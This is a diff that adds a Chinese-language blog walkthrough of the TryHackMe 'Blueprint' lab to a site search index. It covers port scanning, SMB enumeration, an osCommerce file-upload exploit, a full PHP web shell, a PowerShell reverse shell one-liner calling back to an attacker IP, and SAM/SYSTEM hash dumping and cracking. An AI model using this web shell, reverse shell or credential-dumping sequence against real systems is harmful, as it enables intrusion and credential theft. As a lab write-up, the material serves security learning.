@@ -2299,4 +2299,88 @@
         <tag>vulnhub</tag>
       </tags>
   </entry>
+  <entry>
+    <title>Blueprint Walkthrough</title>
+    <url>/2025/04/18/Blueprint/</url>
+    <content><![CDATA[<h1 id="Blueprint-Walkthrough"><a href="#Blueprint-Walkthrough" class="headerlink" title="Blueprint Walkthrough"></a>Blueprint Walkthrough</h1><h2 id="Box-Info"><a href="#Box-Info" class="headerlink" title="Box Info"></a>Box Info</h2><p>官网在这里：<a href="https://tryhackme.com/room/blueprint">blueprint</a></p>
+<p>Hack into this Windows machine and escalate your privileges to Administrator.</p>
+<p><img src="/picture/image-20250419200643931.png" alt="image-20250419200643931"></p>
+<h2 id="The-Hack"><a href="#The-Hack" class="headerlink" title="The Hack"></a>The Hack</h2><p>对目标主机做全端口扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -p- 10.10.253.208 --min-rate 500 </span><br></pre></td></tr></table></figure>
+
+<p>发现开放 80 、135、139、443、445、3306、8080 端口</p>
+<p><img src="/picture/image-20250419191935702.png" alt="image-20250419191935702"></p>
+<p>对开放的端口进行应用版本发现</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -p 80,135,139,443,445,3306,8080 -sC -sV 10.10.253.208</span><br></pre></td></tr></table></figure>
+
+<p>80、8080 开放 HTTP 服务，443 端口开放 SSL&#x2F;HTTP 服务，139&#x2F;445 端口开放 SMB 服务，135 端口开放 RPC 服务</p>
+<p><img src="/picture/image-20250419192043241.png" alt="image-20250419192043241"></p>
+<p>先来看 SMB 服务，使用 smbclient 枚举共享目录</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">smbclient -N -L //10.10.253.208</span><br></pre></td></tr></table></figure>
+
+<p>发现共享目录 Users 和 Windows</p>
+<p><img src="/picture/image-20250419192254263.png" alt="image-20250419192254263"></p>
+<p>远程登陆 Users 共享目录，枚举文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">smbclient -N //10.10.253.208/Users</span><br></pre></td></tr></table></figure>
+
+<p>找了一圈并没有泄露机密信息</p>
+<p><img src="/picture/image-20250419192503970.png" alt="image-20250419192503970"></p>
+<p>再来看 Windows 共享目录，之前权限不够，不能进行枚举</p>
+<p><img src="/picture/image-20250419192610376.png" alt="image-20250419192610376"></p>
+<p>来看 135 端口，rpcclient 能连接但是是权限不够，不能进行枚举</p>
+<p><img src="/picture/image-20250419192726207.png" alt="image-20250419192726207"></p>
+<p>enum4linux 也什么都跑不出来，最后只剩 HTTP 和 SSL&#x2F;HTTP 服务了，依次访问主页面，发现仅 8080 端口正常响应</p>
+<p>&#x2F;docs 似乎是一些文件</p>
+<p><img src="/picture/image-20250419193435437.png" alt="image-20250419193435437"></p>
+<p>&#x2F;catalog 响应页面但是排版错乱，网页内链接指向 localhost，需要进行 SSH 端口转发</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl start ssh</span><br><span class="line">ssh -CNfg -L 8080:10.10.253.208:8080 kali@127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/picture/image-20250419192932929.png" alt="image-20250419192932929"></p>
+<p>再次访问即可响应正常页面</p>
+<p><img src="/picture/image-20250419193051077.png" alt="image-20250419193051077"></p>
+<p>依据 URL 中泄露的版本搜索 EXP ，<a href="https://www.exploit-db.com/exploits/43191">https://www.exploit-db.com/exploits/43191</a> 指名存在文件上传漏洞，需要登录才能利用</p>
+<p>该网站似乎并没有配置完全，需要 New Installation 才行</p>
+<p><img src="/picture/image-20250419193725210.png" alt="image-20250419193725210"></p>
+<p>第一步存在弱口令，账号为 root 密码为空</p>
+<p><img src="/picture/image-20250419193852985.png" alt="image-20250419193852985"></p>
+<p>这里泄露了网站根目录 C:&#x2F;xampp&#x2F;htdocs&#x2F;oscommerce-2.3.4&#x2F;catalog&#x2F;</p>
+<p><img src="/picture/image-20250419174200720.png" alt="image-20250419174200720"></p>
+<p>设置账号密码为 admin&#x2F;admin</p>
+<p><img src="/picture/image-20250419174259691.png" alt="image-20250419174259691"></p>
+<p>编辑上传的 PHP 木马文件 shell.php</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form method=&quot;GET&quot; name=&quot;&lt;?php echo basename($_SERVER[&#x27;PHP_SELF&#x27;]); ?&gt;&quot;&gt;</span><br><span class="line">&lt;input type=&quot;TEXT&quot; name=&quot;cmd&quot; id=&quot;cmd&quot; size=&quot;80&quot;&gt;</span><br><span class="line">&lt;input type=&quot;SUBMIT&quot; value=&quot;Execute&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;pre&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">    if(isset($_GET[&#x27;cmd&#x27;]))</span><br><span class="line">    &#123;</span><br><span class="line">		exec($_GET[&#x27;cmd&#x27;]);</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/pre&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;script&gt;document.getElementById(&quot;cmd&quot;).focus();&lt;/script&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>使用 python2 执行该漏洞利用代码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python2 43191.py -u http://10.10.253.208:8080/oscommerce-2.3.4 --auth=admin:admin -f shell.php</span><br></pre></td></tr></table></figure>
+
+<p>成功上传木马文件</p>
+<p><img src="/picture/image-20250419174352072.png" alt="image-20250419174352072"></p>
+<p>由于目标主机系统为 Windows 使用 powershell 反弹 shell</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell -nop -c &quot;$client = New-Object System.Net.Sockets.TCPClient(&#x27;10.8.99.84&#x27;,4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%&#123;0&#125;;while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &#x27;PS &#x27; + (pwd).Path + &#x27;&gt; &#x27;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()&quot;</span><br></pre></td></tr></table></figure>
+
+<p>成功接收回弹的 shell</p>
+<p><img src="/picture/image-20250419175536025.png" alt="image-20250419175536025"></p>
+<p>进入 Administrator 的桌面即可获得 root.txt</p>
+<p><img src="/picture/image-20250419175503612.png" alt="image-20250419175503612"></p>
+<p>由于笔者 mimitaskz 上传后并不能成功执行，故尝试通过注册表导出 SAM 和 SYSTEM 文件，保存在 C:&#x2F;xampp&#x2F;htdocs&#x2F;oscommerce-2.3.4&#x2F;docs&#x2F; 目录中，这样就可以直接访问 web 站点进行下载</p>
+<p><img src="/picture/image-20250419194629218.png" alt="image-20250419194629218"></p>
+<p>访问 &#x2F;oscommerce-2.3.4&#x2F;docs&#x2F; 目录，点击直接下载 SAM 和 SYSTEM 文件</p>
+<p><img src="/picture/image-20250419194831069.png" alt="image-20250419194831069"></p>
+<p>使用 samdump2 提取 NTLM 哈希</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">samdump2 system.save sam.save </span><br></pre></td></tr></table></figure>
+
+<p>获得 Lab NTLM 哈希</p>
+<p><img src="/picture/image-20250419195535055.png" alt="image-20250419195535055"></p>
+<p>在 <a href="https://crackstation.net/">https://crackstation.net/</a> 破解出 Lab 的明文密码</p>
+<p><img src="/picture/image-20250419200306130.png" alt="image-20250419200306130"></p>
+<h2 id="Final"><a href="#Final" class="headerlink" title="Final"></a>Final</h2><p><img src="/picture/image-20250419200342460.png" alt="image-20250419200342460"></p>
+]]></content>
+      <categories>
+        <category>Penetration Testing</category>
+      </categories>
+      <tags>
+        <tag>Penetration Testing</tag>
+        <tag>THM</tag>
+      </tags>
+  </entry>
 </search>
